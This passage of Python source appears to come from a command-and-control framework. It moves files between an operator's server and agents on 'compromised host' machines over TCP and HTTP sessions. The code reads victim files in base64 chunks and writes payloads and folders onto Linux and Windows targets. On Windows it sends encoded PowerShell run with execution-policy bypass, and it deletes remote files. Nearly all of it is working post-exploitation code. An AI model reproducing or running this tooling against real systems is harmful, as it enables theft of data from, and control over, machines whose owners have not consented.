		print(brightyellow + f"[*] Downloading file from {host} in chunks over TCP...")

		# Step 1: Get file size
		size_cmd = f"stat -c %s {remote_file}"
		client_socket.sendall((size_cmd + "\n").encode())

		file_size_raw = b""
		client_socket.settimeout(2)
		while True:
			try:
				chunk = client_socket.recv(4096)

				if not chunk:
					break

				file_size_raw += chunk

			except socket.timeout:
				break

		try:
			file_size = file_size_raw.decode()
			stripped_file_size = file_size.strip()
			clean_file_size = stripped_file_size.splitlines()[0].strip()
			number_file_size = int(clean_file_size)
			#print(decoded_file_size)
			#file_size = int(file_size_raw.decode().strip())

		except Exception as e:
			print(brightred + f"[-] Failed to get file size: {e}")
			return

		try:
			total_chunks = (number_file_size + CHUNK_SIZE - 1) // CHUNK_SIZE

		except Exception as e:
			print(brightred + f"[-] ERROR failed to calculate total chunks: {e}")

		collected_b64 = ""

		with tqdm(total=total_chunks, desc="Downloading", unit="chunk") as pbar:
			for i in range(total_chunks):
				offset = i * CHUNK_SIZE
				chunk_cmd = f"tail -c +{offset + 1} {remote_file} | head -c {CHUNK_SIZE} | base64"
				client_socket.sendall((chunk_cmd + "\n").encode())

				chunk_data = b""
				while True:
					try:
						part = client_socket.recv(4096)

						if not part:
							break

						chunk_data += part

					except socket.timeout:
						break

				try:
					decoded = chunk_data.decode(errors='ignore').strip()
					#decoded = base64.b64decode(chunk_data.decode().strip())
					collected_b64 += decoded
					pbar.update(1)

				except Exception as e:
					print(brightred + f"[-] Error decoding chunk {i + 1}: {e}")
					break

		try:
			final_bytes = base64.b64decode(collected_b64.encode())

			with open(local_file, "wb") as f:
				f.write(final_bytes)

			with open(local_file, "rb") as f:
				bom = f.read(2)

			# UTF-16LE BOM is 0xFF 0xFE
			if bom == b"\xff\xfe":
				# it’s UTF-16LE — convert it in-place
				tmp = local_file + ".utf8"
				subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
				os.replace(local_file + '.tmp', local_file)
				
				#print(f"[+] Converted {local_file} from UTF-16LE → UTF-8")

			else:
				pass

			print(brightgreen + f"[+] Download complete. Saved to {local_file}")

		except Exception as e:
			print(brightred + f"[!] Error saving file: {e}")


	elif meta.get("os", "").lower() == "windows":
		CHUNK_SIZE = 30000

		try:
			# Get file size
			size_cmd = (
				f"$s=(Get-Item \"{remote_file}\").Length;"
				f"[System.Text.Encoding]::UTF8.GetBytes($s.ToString()) -join ','"
			)
			client_socket.sendall((size_cmd + "\n").encode())
			raw_size = client_socket.recv(4096).decode()
			size_str = bytes([int(x) for x in raw_size.strip().split(",")]).decode()
			file_size = int(size_str.strip())
			

		except Exception as e:
			print(brightred + f"[-] Failed to get file size: {e}")
			return

		total_chunks = (file_size + CHUNK_SIZE - 1) // CHUNK_SIZE
		collected_b64 = ""

		print(brightyellow + f"[*] Downloading file from Windows agent {sid} in chunks...")

		with tqdm(total=total_chunks, desc="Downloading", unit="chunk") as pbar:
			for i in range(total_chunks):
				offset = i * CHUNK_SIZE
				chunk_cmd = (
					f"$fs = [System.IO.File]::OpenRead(\"{remote_file}\");"
					f"$fs.Seek({offset},'Begin') > $null;"
					f"$buf = New-Object byte[] {CHUNK_SIZE};"
					f"$read = $fs.Read($buf, 0, {CHUNK_SIZE});"
					f"$fs.Close();"
					f"[Convert]::ToBase64String($buf, 0, $read)"
				)

				client_socket.sendall((chunk_cmd + "\n").encode())

				client_socket.settimeout(3)
				chunk_data = b""
				try:
					expected_encoded_len = int(((CHUNK_SIZE + 2) // 3) * 4)  # Base64 size
					while len(chunk_data) < expected_encoded_len:
						try:
							part = client_socket.recv(4096)
							if not part:
								break

							chunk_data += part

							if b"\n" in part:
								break

						except Exception as e:
							print(brightred + f"[-] ERROR an error ocurred: {e}")

				except socket.timeout:
					pass

				try:
					#base64_decoded_chunk = base64.b64decode(chunk_data)
					chunk_decoded = chunk_data.decode(errors='ignore').strip()
					#chunk_decoded = base64.b64decode(chunk_data).decode()
					collected_b64 += chunk_decoded
					pbar.update(1)

				except Exception as e:
					print(brightred + f"[-] Failed decoding chunk {i+1}: {e}")
					break

		try:
			final_data = base64.b64decode(collected_b64.encode())

			with open(local_file, "wb") as f:
				f.write(final_data)

			with open(local_file, "rb") as f:
				bom = f.read(2)

			# UTF-16LE BOM is 0xFF 0xFE
			if bom == b"\xff\xfe":
				# it’s UTF-16LE — convert it in-place
				tmp = local_file + ".utf8"
				subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
				os.replace(local_file + '.tmp', local_file)
				
				#print(f"[+] Converted {local_file} from UTF-16LE → UTF-8")

			else:
				pass

			#subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
			#os.replace(local_file + '.tmp', local_file)

			print(brightgreen + f"\n[+] Download complete. Saved to {local_file}\n")

		except Exception as e:
			print(brightred + f"[!] Error writing final file: {e}")
			

### 🔥 Upload Logic (NEW!) ###

CHUNK_SIZE = 7000  #You can change this!!

# Build the powershell to append a chunk
def build_chunk_upload_command(remote_file, b64chunk):
	safe_chunk = b64chunk.replace("'", "''")  # PowerShell escape for single quotes
	#safe_path = remote_file.replace("\\", "\\\\")

	raw_commanddata = (
		"[Console]::OutputEncoding = [System.Text.Encoding]::ASCII;"
		"[Console]::InputEncoding  = [System.Text.Encoding]::ASCII;"
		f"$bytes = [Convert]::FromBase64String(\"{safe_chunk}\");"
		f"$stream = [System.IO.File]::Open(\"{remote_file}\", 'Append', 'Write', 'None');"
		"$stream.Write($bytes, 0, $bytes.Length);"
		"$stream.Close()"
	)

	encoded_command = base64.b64encode(raw_commanddata.encode("utf-16le")).decode()
	full_cmd = f"powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded_command}"
	return full_cmd


# Upload for HTTP agents
def upload_file_http(sid, local_file, remote_file):
	session = session_manager.sessions[sid]
	meta = session.metadata
	host = meta.get("hostname", "").lower()
	os_type = meta.get("os", "").lower()

	if os_type == "linux":
		CHUNK_SIZE = 45000

		# Clear the remote file first
		clear_cmd = f"rm -f {remote_file}"
		b64_clear = base64.b64encode(clear_cmd.encode()).decode()
		session.command_queue.put(b64_clear)
		session.output_queue.get()

		try:
			with open(local_file, "r") as f:
				file_data = f.read()

		except Exception as e:
			print(brightred + f"[-] ERROR opening local file: {e}")

		#print("DEBUG")

		try:
			if file_data and file_data is not None:
				b64_filedata = base64.b64encode(file_data.encode()).decode()

			else:
				print(brightred + f"[-] ERROR failed to encode local file.")

		except Exception as e:
			print(brightred + f"[-] ERROR failed to encode local file because of error: {e}")

		#print("DEBUG1")

		total_chunks = (len(b64_filedata) + CHUNK_SIZE - 1) // CHUNK_SIZE

		#print("SET TOTAL CHUNKS")


		try:
			with tqdm(total=total_chunks, desc="Uploading", unit="chunk") as pbar:
				for i in range(0, len(b64_filedata), CHUNK_SIZE):
					#print("ENTERED FOR LOOP")
					chunk = b64_filedata[i:i + CHUNK_SIZE]
					cmd = f"printf '%s' '{chunk}' | base64 -d >> {remote_file}"
					b64_cmd = base64.b64encode(cmd.encode()).decode()
					session.command_queue.put(b64_cmd)
					session.output_queue.get()
					pbar.update(1)

		except Exception as e:
			print(brightred + f"[-] ERROR failed to upload file chunks to {host}")
			print(brightred + f"[-] ERROR DEBUG INFO: {e}")

		print(brightyellow + f"[*] Uploading file to HTTP agent {host}...")
			
		
	elif os_type == "windows":
		CHUNK_SIZE = 5000
		# Read file and prepare chunks

		try:
			with open(local_file, "rb") as f:
				file_data = f.read()

		except Exception as e:
			print(brightred + f"[-] ERROR ocurred: {e}")


		b64_data = base64.b64encode(file_data).decode()

		total_chunks = (len(b64_data) + CHUNK_SIZE - 1) // CHUNK_SIZE

		# Clear existing remote file
		clear_cmd = f"&{{ Try {{ Remove-Item -Path \"{remote_file}\" -ErrorAction Stop }} Catch {{ }} }}"
		b64_clear = base64.b64encode(clear_cmd.encode()).decode()
		session.command_queue.put(b64_clear)


		print(brightyellow + f"[*] Uploading file to HTTP agent {sid}...")

		# Send chunks
		try:
			with tqdm(total=total_chunks, desc="Uploading", unit="chunk") as pbar:
				for i in range(0, len(b64_data), CHUNK_SIZE):
					chunk = b64_data[i:i + CHUNK_SIZE]
					chunk_cmd = build_chunk_upload_command(remote_file, chunk)
					b64_chunk_cmd = base64.b64encode(chunk_cmd.encode()).decode()
					session.command_queue.put(b64_chunk_cmd)
					session.output_queue.get()
					pbar.update(1)

		except Exception as e:
			print(brightred + f"[-] ERROR failed to upload file chunks to {host}")
			print(brightred + f"[-] ERROR DEBUG INFO: {e}")

		print(brightgreen + f"[+] Upload complete for {remote_file}")

def upload_folder_http(sid, local_dir, remote_dir):
	print("IN FUNCTION")
	session = session_manager.sessions.get(sid)
	if not session:
		print(brightred + f"[!] No such session: {sid}")
		return

	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)

	meta = session.metadata
	os_type = meta.get("os", "").lower()
	print(os_type)

	if "linux" in os_type:
		cmd = f"mkdir -p \"{remote_dir}\""
		b64_cmd = base64.b64encode(cmd.encode()).decode()
		session.command_queue.put(b64_cmd)

		base = os.path.basename(remote_dir.rstrip("/\\"))
		tmp = tempfile.mkdtemp()
		local_archive = os.path.join(tmp, f"{base}.tar.gz")
		shutil.make_archive(os.path.splitext(local_archive)[0], 'gztar', root_dir=local_dir)
		remote_archive = f"{remote_dir.rstrip('/\\')}.tar.gz"

		upload_file_http(sid, local_archive, remote_archive)

		cmd = f"tar xzf \"{remote_archive}\" -C \"{remote_dir}\""
		b64_cmd = base64.b64encode(cmd.encode()).decode()
		session.command_queue.put(b64_cmd)

		cleanup = f"rm -f \"{remote_archive}\""
		b64_cmd = base64.b64encode(cleanup.encode()).decode()
		session.command_queue.put(b64_cmd)

		try:
			os.remove(local_archive)
			os.rmdir(tmp)

		except Exception as e:
			print(brightred + f"[-] ERROR failed to remove local temp and archive files: {e}")

		print(brightgreen + "[+] Folder upload and extraction complete")

	elif "windows" in os_type:
		cmd = f"if(-Not (Test-Path \"{remote_dir}\")) {{ New-Item -ItemType Directory -Path \"{remote_dir}\" }}"

		b64_cmd = base64.b64encode(cmd.encode()).decode()
		session.command_queue.put(b64_cmd)
		base = os.path.basename(remote_dir.rstrip("/\\"))
		tmp = tempfile.mkdtemp()

		local_archive = os.path.join(tmp, f"{base}.zip")

		try:
			shutil.make_archive(os.path.splitext(local_archive)[0], 'zip', root_dir=local_dir)

		except Exception as e:
			print(brightred + f"[-] ERROR failed to create local archive to upload: {e}")

		remote_archive = f"{remote_dir.rstrip('/\\')}.zip"
		upload_file_http(sid, local_archive, remote_archive)

		print(brightyellow + f"[*] Extracting archive on compromised host {display}")
		cmd = f"Expand-Archive -Path \"{remote_archive}\" -DestinationPath \"{remote_dir}\" -Force"
		b64_cmd = base64.b64encode(cmd.encode()).decode()
		session.command_queue.put(b64_cmd)

		print(brightyellow + f"[*] Cleaning up temp files...")
		cmd = f"Remove-Item \"{remote_archive}\" -Force"
		b64_cmd = base64.b64encode(cmd.encode()).decode()
		session.command_queue.put(b64_cmd)

		try:
			os.remove(local_archive)
			os.rmdir(tmp)

		except Exception as e:
			print(brightred + f"[-] ERROR failed to remove local temp and archive files: {e}")

		print(brightgreen + "[+] Folder upload and extraction complete")

	else:
		print(brightred + f"[-] ERROR unsupported operating system.")


# Upload for TCP agents
def upload_file_tcp(sid, local_file, remote_file):
	client_socket = session_manager.sessions[sid].handler
	session = session_manager.sessions[sid]
	meta = session.metadata
	host = meta.get("hostname", "").lower()
	os_type = meta.get("os", "").lower()
	CHUNK_SIZE = 45000

	print(brightyellow + f"[*] Uploading file to TCP agent {host}...")

	try:
		with open(local_file, "rb") as f:
			file_data = f.read()
	except Exception as e:
		print(brightred + f"[-] ERROR opening local file: {e}")
		return

	try:
		if file_data:
			b64_data = base64.b64encode(file_data).decode()
		else:
			print(brightred + f"[-] ERROR: local file was empty or unreadable.")
			return
	except Exception as e:
		print(brightred + f"[-] ERROR encoding local file: {e}")
		return

	if os_type == "windows":
		clear_cmd = f"&{{ Try {{ Remove-Item -Path \"{remote_file}\" -ErrorAction Stop }} Catch {{ }} }}\n"

	elif os_type == "linux":
		clear_cmd = f"rm -f \"{remote_file}\"\n"

	else:
		print(brightred + f"[-] Unsupported OS type: {os_type}")
		return

	try:
		client_socket.sendall(clear_cmd.encode())

	except Exception as e:
		print(brightred + f"[-] ERROR sending command: {e}")
		return

	total_chunks = (len(b64_data) + CHUNK_SIZE - 1) // CHUNK_SIZE

	if os_type == "linux":
		try:
			with tqdm(total=total_chunks, desc="Uploading", unit="chunk") as pbar:
				for i in range(total_chunks):
					chunk = b64_data[i * CHUNK_SIZE : (i + 1) * CHUNK_SIZE]
					chunk_cmd = f"printf '%s' '{chunk}' | base64 -d >> \"{remote_file}\"\n"

					try:
						client_socket.sendall(chunk_cmd.encode())
						try:
							pbar.update(1)

						except Exception as e:
							print(brightred + f"[-] ERROR printing progress bar: {e}")

					except Exception as e:
						print(brightred + f"[-] ERROR ocurred when sending command: {e}")

		except Exception as e:
			print(brightred + f"[-] ERROR sending chunk {i//CHUNK_SIZE + 1}: {e}")
			return

		print(brightgreen + f"[+] Upload complete for {remote_file}")

	elif os_type == "windows":
		CHUNK_SIZE = 5000
		total_chunks = (len(b64_data) + CHUNK_SIZE - 1) // CHUNK_SIZE
		try:
			with tqdm(total=total_chunks, desc="Uploading", unit="chunk") as pbar:
				for i in range(total_chunks):
					chunk = b64_data[i * CHUNK_SIZE : (i + 1) * CHUNK_SIZE]
					chunk_cmd = build_chunk_upload_command(remote_file, chunk) + "\n"

					try:
						client_socket.sendall(chunk_cmd.encode())
						try:
							pbar.update(1)

						except Exception as e:
							print(brightred + f"[-] ERROR printing progress bar: {e}")

					except Exception as e:
						print(brightred + f"[-] ERROR sending chunk {i//CHUNK_SIZE + 1}: {e}")
						return

		except Exception as e:
			print(brightred + f"[-] ERROR sending chunk {i//CHUNK_SIZE + 1}: {e}")
			return

		print(brightgreen + f"[+] Upload complete for {remote_file}")

	else:
		print(brightred + f"[-] Unsupported OS detected!")

def upload_folder_tcp(sid, local_dir, remote_dir):
	"""
	Upload a local folder over TCP by compressing it locally, sending the archive,
	extracting it on the target, and cleaning up.
	"""
	session = session_manager.sessions.get(sid)
	if not session:
		print(brightred + f"[!] No such session: {sid}")
		return

	display = get_display(sid)

	try:
		meta = session.metadata
		os_type = meta.get("os", "").lower()

	except Exception as e:
		print(brightred + f"[-] ERROR failed to grab the session's metadata: {e}")

	remote_dir = remote_dir.rstrip("/\\")
	base = os.path.basename(remote_dir)

	if "linux" in os_type:
		# 1) ensure remote directory exists
		cmd = f"mkdir -p \"{remote_dir}\""
		run_quiet_tcpcmd(sid, cmd)

		# 2) create a local tar.gz of the folder
		tmp = tempfile.mkdtemp()
		local_archive = os.path.join(tmp, f"{base}.tar.gz")

		try:
			shutil.make_archive(os.path.splitext(local_archive)[0], 'gztar', root_dir=local_dir)

		except Exception as e:
			print(brightred + f"[-] ERROR failed to create local archive to upload: {e}")

		# 3) upload the archive
		remote_archive = f"{remote_dir}.tar.gz"
		upload_file_tcp(sid, local_archive, remote_archive)

		# 4) extract it remotely and clean up
		print(brightyellow + f"[*] Extracting archive on compromised host {display}")
		cmd = f"tar xzf \"{remote_archive}\" -C \"{remote_dir}\""
		run_quiet_tcpcmd(sid, cmd)

		print(brightyellow + f"[*] Cleaning up temp files...")
		cmd = f"rm -rf \"{remote_archive}\""
		run_quiet_tcpcmd(sid, cmd)

		try:
			os.remove(local_archive)
			os.rmdir(tmp)

		except Exception as e:
			print(brightred + f"[-] ERROR failed to remove local temp and archive files: {e}")

		print(brightgreen + "[+] Folder upload and extraction complete")

	elif "windows" in os_type:
		# 1) ensure remote directory exists
		cmd = f"if(-Not (Test-Path \"{remote_dir}\")) {{ New-Item -ItemType Directory -Path \"{remote_dir}\" }}"
		run_quiet_tcpcmd(sid, cmd)

		# 2) create a local .zip of the folder
		tmp = tempfile.mkdtemp()
		local_archive = os.path.join(tmp, f"{base}.zip")

		try:
			shutil.make_archive(os.path.splitext(local_archive)[0], 'zip', root_dir=local_dir)

		except Exception as e:
			print(brightred + f"[-] ERROR failed to create local archive to upload: {e}")

		# 3) upload the archive
		remote_archive = f"{remote_dir}.zip"
		upload_file_tcp(sid, local_archive, remote_archive)

		# 4) extract remotely and clean up
		print(brightyellow + f"[*] Extracting archive on compromised host {display}")
		cmd = f"Expand-Archive -Path \"{remote_archive}\" -DestinationPath \"{remote_dir}\" -Force"
		run_quiet_tcpcmd(sid, cmd)

		print(brightyellow + f"[*] Cleaning up temp files...")
		cmd = f"Remove-Item \"{remote_archive}\" -Force"
		run_quiet_tcpcmd(sid, cmd)

		# 5) remove local temp files
		try:
			os.remove(local_archive)
			os.rmdir(tmp)

		except Exception as e:
			print(brightred + f"[-] ERROR failed to remove local temp and archive files: {e}")

		print(brightgreen + "[+] Folder upload and extraction complete")

	else:
		print(brightred + f"[-] ERROR unsupported operating system: {os_type}")


def get_display(sid):
	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
	return display

def run_quiet_tcpcmd(sid, cmd, timeout=0.5):
	global_tcpoutput_blocker = 1
	run_command_tcp(sid, cmd, timeout)
	global_tcpoutput_blocker = 0


output_queue = queue.Queue()

def printer_thread():
	while True:
		sid, out_b64 = output_queue.get()
		try:
			out = base64.b64decode(out_b64).decode("utf-8", "ignore")
			#print("TEST")
		except:
			out = "<decoding error>"
		print(f"\n[{sid}] {out.strip()}")

